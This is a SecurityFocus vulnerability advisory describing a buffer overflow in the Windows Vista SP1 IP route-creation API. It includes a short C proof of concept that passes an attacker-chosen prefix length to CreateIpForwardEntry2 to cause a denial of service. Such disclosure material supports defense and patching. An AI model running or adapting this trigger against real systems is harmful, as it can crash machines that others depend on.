source: http://www.securityfocus.com/bid/32357/info


Microsoft Windows Vista is prone to a buffer-overflow vulnerability because of insufficient boundary checks.

Local attackers could exploit this issue to cause denial-of-service conditions. Given the nature of this issue, attackers may also be able to execute arbitrary code with SYSTEM-level privileges, but this has not been confirmed.

Windows Vista SP1 is vulnerable to this issue.

UPDATE (November 25, 2008): Since this issue may be exploitable only by members of the administrative group, the security implication of this issue may be negated. 

#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2ipdef.h>
#include <iphlpapi.h>

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
        DWORD                      dwStatus;
        MIB_IPFORWARD_ROW2 route;
        
        if (argc != 3)
        {
                printf("Usage: %s <ifNum> <numOfBits>\n\n", argv[0]);
                return -1;
        }

        InitializeIpForwardEntry(&route);       

        route.InterfaceIndex = atoi(argv[1]);
        route.DestinationPrefix.Prefix.si_family = AF_INET;

        route.DestinationPrefix.Prefix.Ipv4.sin_addr.s_addr = inet_addr("1.2.3.0");     
        route.DestinationPrefix.Prefix.Ipv4.sin_family = AF_INET;

        route.DestinationPrefix.PrefixLength = atoi(argv[2]);
        
        route.NextHop.Ipv4.sin_addr.s_addr = inet_addr("11.22.33.44");  
        route.NextHop.Ipv4.sin_family       = AF_INET;

        route.SitePrefixLength          = 0;

        route.Protocol                  = MIB_IPPROTO_NETMGMT;          
        route.Origin                            = NlroManual;
        route.ValidLifetime             = 0xffffffff;
        route.PreferredLifetime         = 0xffffffff;
        route.Metric                            = 1;
        
        dwStatus = CreateIpForwardEntry2(&route); 
        return dwStatus;
}
